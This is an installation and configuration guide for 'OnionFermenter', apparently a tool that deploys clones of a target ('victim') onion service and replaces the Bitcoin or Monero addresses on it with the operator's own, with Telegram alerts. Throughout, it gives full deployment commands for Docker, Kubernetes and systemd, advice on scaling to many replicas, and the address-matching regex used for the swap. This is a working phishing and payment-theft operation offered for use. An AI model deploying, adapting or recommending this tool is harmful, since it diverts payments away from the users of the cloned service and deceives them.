# OnionFermenter Installation Guide

This guide covers complete installation from scratch, including all prerequisites and dependencies.

## Table of Contents
1. [System Requirements](#system-requirements)
2. [Prerequisites Installation](#prerequisites-installation)
3. [OnionFermenter Installation](#onionfermenter-installation)
4. [Customization Guide](#customization-guide)
5. [Troubleshooting](#troubleshooting)

---

## System Requirements

### Minimum Requirements
- **OS**: Linux (Ubuntu 20.04+, Debian 10+, CentOS 8+, or Alpine)
- **RAM**: 512 MB minimum, 1 GB recommended
- **Storage**: 2 GB free space
- **Network**: Internet connection for initial setup

### Supported Deployment Methods
- Docker (recommended for beginners)
- Kubernetes (recommended for production scale)
- Bare Metal with systemd (for VPS deployments)

---

## Prerequisites Installation

### Option 1: Docker Deployment (Recommended)

#### Ubuntu/Debian
```bash
# Update package index
sudo apt-get update

# Install required packages
sudo apt-get install -y \
    ca-certificates \
    curl \
    gnupg \
    lsb-release \
    make \
    git

# Add Docker's official GPG key
sudo mkdir -p /etc/apt/keyrings
curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo gpg --dearmor -o /etc/apt/keyrings/docker.gpg

# Set up Docker repository
echo \
  "deb [arch=$(dpkg --print-architecture) signed-by=/etc/apt/keyrings/docker.gpg] https://download.docker.com/linux/ubuntu \
  $(lsb_release -cs) stable" | sudo tee /etc/apt/sources.list.d/docker.list > /dev/null

# Install Docker Engine
sudo apt-get update
sudo apt-get install -y docker-ce docker-ce-cli containerd.io docker-compose-plugin

# Add your user to docker group (optional, to run without sudo)
sudo usermod -aG docker $USER
newgrp docker

# Verify Docker installation
docker --version
docker run hello-world
```

#### CentOS/RHEL/Fedora
```bash
# Remove old versions
sudo yum remove docker docker-client docker-client-latest docker-common docker-latest docker-latest-logrotate docker-logrotate docker-engine

# Install required packages
sudo yum install -y yum-utils make git

# Add Docker repository
sudo yum-config-manager --add-repo https://download.docker.com/linux/centos/docker-ce.repo

# Install Docker Engine
sudo yum install -y docker-ce docker-ce-cli containerd.io docker-compose-plugin

# Start Docker
sudo systemctl start docker
sudo systemctl enable docker

# Add your user to docker group (optional)
sudo usermod -aG docker $USER
newgrp docker

# Verify installation
docker --version
```

### Option 2: Kubernetes Deployment

#### Install kubectl
```bash
# Download latest kubectl
curl -LO "https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl"

# Install kubectl
sudo install -o root -g root -m 0755 kubectl /usr/local/bin/kubectl

# Verify installation
kubectl version --client
```

#### Install Helm
```bash
# Download Helm installation script
curl https://raw.githubusercontent.com/helm/helm/main/scripts/get-helm-3 | bash

# Verify installation
helm version
```

#### Install make
```bash
# Ubuntu/Debian
sudo apt-get install -y make

# CentOS/RHEL
sudo yum install -y make
```

### Option 3: Bare Metal Deployment

#### Install Erlang and Build Tools
```bash
# Ubuntu/Debian
sudo apt-get update
sudo apt-get install -y \
    erlang \
    erlang-dev \
    erlang-parsetools \
    build-essential \
    git \
    wget \
    bash \
    tor \
    socat \
    curl

# Install rebar3 (Erlang build tool)
wget https://s3.amazonaws.com/rebar3/rebar3
chmod +x rebar3
sudo mv rebar3 /usr/local/bin/

# Verify Erlang installation
erl -version
rebar3 version
```

#### CentOS/RHEL
```bash
# Enable EPEL repository
sudo yum install -y epel-release

# Install Erlang and dependencies
sudo yum install -y \
    erlang \
    git \
    wget \
    bash \
    tor \
    socat \
    curl \
    gcc \
    gcc-c++ \
    make

# Install rebar3
wget https://s3.amazonaws.com/rebar3/rebar3
chmod +x rebar3
sudo mv rebar3 /usr/local/bin/

# Start and enable Tor
sudo systemctl start tor
sudo systemctl enable tor
```

---

## OnionFermenter Installation

### Step 1: Clone the Repository
```bash
# Clone from GitHub
git clone https://github.com/bitbybit91/OnionFermenter.git
cd OnionFermenter

# Verify you're on the correct branch
git branch -a
```

### Step 2: Choose Your Deployment Method

#### A. Docker Deployment

1. **Pull the Docker image** (or build it yourself):
```bash
# Option 1: Pull pre-built image
docker pull docker.io/valtteri/onionfermenter:latest

# Option 2: Build from source
make build
```

2. **Prepare your configuration files**:
```bash
# For Bitcoin
cp examples/btc-addresses-example.txt my-btc-addresses.txt
cp examples/btc-config-example.env my-config.env

# OR for Monero
cp examples/xmr-addresses-example.txt my-xmr-addresses.txt
cp examples/xmr-config-example.env my-config.env

# Edit the files with your values
nano my-btc-addresses.txt  # Add your cryptocurrency addresses
nano my-config.env         # Configure your settings
```

3. **Load configuration and run**:
```bash
# Load environment variables
source my-config.env

# Set the address file path (use absolute path)
export ADDRESS_FILE="$(pwd)/my-btc-addresses.txt"

# Run OnionFermenter
make run

# Check if it's running
docker ps | grep onionfermenter

# View logs
docker logs $(docker ps | grep onionfermenter | awk '{print $1}')
```

#### B. Kubernetes Deployment

1. **Ensure kubectl is configured** to your cluster:
```bash
kubectl cluster-info
kubectl get nodes
```

2. **Prepare configuration**:
```bash
# Create address file
cp examples/btc-addresses-example.txt my-btc-addresses.txt
nano my-btc-addresses.txt  # Add your addresses

# Set environment variables
export VICTIM_ONION_ID=your_target_onion_id_without_dot_onion
export ADDRESS_FILE="$(pwd)/my-btc-addresses.txt"
export CURRENCY_TYPE=BTC
export NREPLICAS=1
export TELEGRAM_BOT_TOKEN=your_bot_token    # Optional
export TELEGRAM_CHAT_ID=your_chat_id        # Optional
```

3. **Deploy to Kubernetes**:
```bash
# Deploy
make deploy

# Check deployment status
kubectl -n onionfermenter get pods
kubectl -n onionfermenter get deployments

# Get onion addresses of your clones
make get-addresses

# View logs
kubectl -n onionfermenter logs -l app=onionfermenter --tail=100
```

#### C. Bare Metal with Systemd

1. **Build the application**:
```bash
# Compile the Erlang application
rebar3 as prod release

# The release will be in _build/prod/rel/onionfermenter/
```

2. **Install to system directory**:
```bash
# Create installation directory
sudo mkdir -p /opt/onionfermenter

# Copy release
sudo cp -r _build/prod/rel/onionfermenter/* /opt/onionfermenter/

# Copy run script
sudo cp deploy/run.sh /opt/onionfermenter/

# Make executable
sudo chmod +x /opt/onionfermenter/run.sh

# Create address file
sudo cp examples/btc-addresses-example.txt /opt/onionfermenter/BTC-ADDRESSES.txt
sudo nano /opt/onionfermenter/BTC-ADDRESSES.txt  # Edit with your addresses
```

3. **Configure systemd service**:
```bash
# Copy service file
sudo cp deploy/onionfermenter.service /etc/systemd/system/

# Edit service configuration
sudo nano /etc/systemd/system/onionfermenter.service

# Update these values in the service file:
# Environment="VICTIM_ONION_ID=your_target_onion_id"
# Environment="CURRENCY_TYPE=BTC"
# Environment="TELEGRAM_BOT_TOKEN=your_token"
# Environment="TELEGRAM_CHAT_ID=your_chat_id"
```

4. **Start the service**:
```bash
# Reload systemd
sudo systemctl daemon-reload

# Enable service to start on boot
sudo systemctl enable onionfermenter

# Start the service
sudo systemctl start onionfermenter

# Check status
sudo systemctl status onionfermenter

# View logs
sudo journalctl -u onionfermenter -f
```

---

## Customization Guide

### Currency Configuration

#### Bitcoin (BTC)
```bash
export CURRENCY_TYPE=BTC
export ADDRESS_FILE=/path/to/btc-addresses.txt
```

**Address Format Requirements:**
- Legacy addresses (1...): 26-35 characters
- SegWit addresses (3...): 26-35 characters
- Native SegWit (bc1...): 42-62 characters

**Example BTC addresses file:**
```
bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh
1BvBMSEYstWetqTFn5Au4m4GFg7xJaNVN2
3J98t1WpEZ73CNmYviecrnyiWrnqRhWNLy
```

#### Monero (XMR)
```bash
export CURRENCY_TYPE=XMR  # or MONERO
export ADDRESS_FILE=/path/to/xmr-addresses.txt
```

**Address Format Requirements:**
- Standard addresses (4...): 95 characters
- Subaddresses (8...): 95 characters

**Example XMR addresses file:**
```
48YourMoneroMainAddressHere1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890ABCDEFGHIJ
41YourMoneroSubAddressHere1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890ABCDEFGHIJ
```

### Telegram Notifications Setup

1. **Create a Telegram Bot:**
```
- Open Telegram and search for @BotFather
- Send: /newbot
- Follow the prompts to create your bot
- Copy the bot token (format: 123456789:ABCdefGHIjklMNOpqrsTUVwxyz)
```

2. **Get Your Chat ID:**
```
- Search for @userinfobot on Telegram
- Send: /start
- Copy your chat ID (numeric value)
```

3. **Configure Environment Variables:**
```bash
export TELEGRAM_BOT_TOKEN=123456789:ABCdefGHIjklMNOpqrsTUVwxyz
export TELEGRAM_CHAT_ID=987654321
```

4. **Test Telegram Notifications:**
After starting OnionFermenter, you should receive a startup message.

### Scaling Configuration

#### Docker (Single Instance)
```bash
# No special configuration needed
make run
```

#### Kubernetes (Multiple Replicas)
```bash
# Set number of replicas
export NREPLICAS=10

# Deploy
make deploy

# Scale up/down
kubectl -n onionfermenter scale deployment/your-deployment-name --replicas=20
```

### Advanced Configuration

#### Custom Docker Image
```bash
# Edit Dockerfile if needed
nano Dockerfile

# Build custom image
docker build -t myuser/onionfermenter:custom .

# Update Makefile to use your image
# Or run directly:
docker run \
  --rm \
  --detach \
  --restart unless-stopped \
  -e VICTIM_ONION_ID=target_onion_id \
  -e CURRENCY_TYPE=BTC \
  -e TELEGRAM_BOT_TOKEN=your_token \
  -e TELEGRAM_CHAT_ID=your_chat_id \
  --mount type=bind,source=/path/to/addresses.txt,target=/onionfermenter/BTC-ADDRESSES.txt,readonly \
  myuser/onionfermenter:custom
```

#### Environment Variables Reference

| Variable | Required | Default | Description |
|----------|----------|---------|-------------|
| `VICTIM_ONION_ID` | Yes | - | Target onion service ID (without .onion) |
| `CURRENCY_TYPE` | No | BTC | Currency type: BTC, XMR, or MONERO |
| `ADDRESS_FILE` | Yes | - | Path to address file |
| `TELEGRAM_BOT_TOKEN` | No | - | Telegram bot token for notifications |
| `TELEGRAM_CHAT_ID` | No | - | Telegram chat ID for notifications |
| `NREPLICAS` | No | 1 | Number of replicas (Kubernetes only) |

#### Customizing Address Detection

If you need to modify regex patterns for address detection, edit:
```bash
nano src/onionfermenter_worker_server.erl
```

Find the `get_address_pattern/1` function and modify as needed:
```erlang
get_address_pattern(CurrencyType) ->
    case CurrencyType of
        "XMR" -> "([48][0-9AB][1-9A-HJ-NP-Za-km-z]{93})(?:[^a-zA-Z0-9\/\.])";
        "MONERO" -> "([48][0-9AB][1-9A-HJ-NP-Za-km-z]{93})(?:[^a-zA-Z0-9\/\.])";
        _ -> "((?:bc1|bc1p|[13])[a-zA-HJ-NP-Z0-9]{25,39})(?:[^a-zA-Z0-9\/\.])"
    end.
```

After modifications, rebuild:
```bash
# Docker
make build

# Bare metal
rebar3 as prod release
```

---

## Troubleshooting

### Common Issues

#### Docker: "Permission denied"
```bash
# Add user to docker group
sudo usermod -aG docker $USER
newgrp docker

# Or run with sudo
sudo -E make run
```

#### Docker: Container immediately exits
```bash
# Check logs
docker logs $(docker ps -a | grep onionfermenter | head -1 | awk '{print $1}')

# Common causes:
# 1. Invalid VICTIM_ONION_ID
# 2. Address file not found or empty
# 3. Tor connection issues
```

#### Kubernetes: Pods in CrashLoopBackOff
```bash
# Check pod logs
kubectl -n onionfermenter logs <pod-name>

# Check pod events
kubectl -n onionfermenter describe pod <pod-name>

# Common causes:
# 1. ConfigMap not created (address file)
# 2. Invalid environment variables
# 3. Resource constraints
```

#### Systemd: Service fails to start
```bash
# Check detailed logs
sudo journalctl -u onionfermenter -n 100 --no-pager

# Check if Tor is running
sudo systemctl status tor

# Verify file permissions
ls -la /opt/onionfermenter/
ls -la /var/lib/tor/
```

#### Telegram: No notifications received
```bash
# 1. Verify bot token and chat ID
curl -X GET "https://api.telegram.org/bot<YOUR_BOT_TOKEN>/getMe"

# 2. Test sending a message manually
curl -X POST "https://api.telegram.org/bot<YOUR_BOT_TOKEN>/sendMessage" \
  -d "chat_id=<YOUR_CHAT_ID>" \
  -d "text=Test message"

# 3. Check OnionFermenter logs for Telegram errors
# Docker:
docker logs <container_id> | grep -i telegram

# Kubernetes:
kubectl -n onionfermenter logs <pod-name> | grep -i telegram

# Systemd:
sudo journalctl -u onionfermenter | grep -i telegram
```

#### Address not being replaced
```bash
# 1. Verify address file format (one address per line)
cat /path/to/addresses.txt

# 2. Ensure addresses are correct length
# 3. Check if addresses contain only valid characters
# 4. Verify CURRENCY_TYPE matches address file
# 5. Check logs for regex matching issues
```

### Getting Help

1. **Check logs** in detail for error messages
2. **Review configuration** files for typos
3. **Verify prerequisites** are installed correctly
4. **Test individual components** (Tor, Docker, etc.)
5. **Refer to examples/** directory for working configurations

### Verification Commands

```bash
# Check if Tor is working
curl --socks5-hostname localhost:9050 http://check.torproject.org

# Test Docker connectivity
docker run --rm alpine ping -c 3 google.com

# Verify Kubernetes cluster
kubectl cluster-info dump

# Check system resources
free -h
df -h
docker stats
```

---

## Next Steps

After successful installation:

1. **Test with example addresses** first before using real ones
2. **Monitor logs** for the first few minutes
3. **Verify Telegram notifications** are working
4. **Scale gradually** if using Kubernetes
5. **Set up monitoring** for production deployments

For more information:
- Main README.md - Usage examples and features
- examples/README.md - Configuration examples
- CHANGELOG.md - Recent changes and updates
